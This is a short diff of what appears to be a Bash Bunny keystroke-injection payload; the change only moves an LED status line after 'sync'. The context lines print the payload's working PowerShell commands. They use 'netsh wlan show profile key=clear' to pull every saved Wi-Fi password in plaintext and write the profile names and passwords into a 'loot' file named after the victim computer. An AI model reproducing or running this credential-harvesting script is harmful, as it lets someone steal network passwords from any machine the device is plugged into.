@@ -33,5 +33,5 @@ Q STRING \%\{\(netsh wlan show profile name\=\""\$name\"" key\=clear\)\}  \| Sel
 Q STRING \%\{\$pass\=\$_.Matches.Groups\[1\].Value.Trim\(\)\; \$_\} \| \%\{\[PSCustomObject\]@\{ "PROFILE_NAME"\=\$name\;PASSWORD\=\$pass \}\} \|
 Q STRING Format-Table -AutoSize \| Out-File \$Bunny\\loot\\WiFiCreds\\WiFiCreds_\$env:computername.txt
 Q ENTER
-LED R B 200
 sync
+LED R B 200
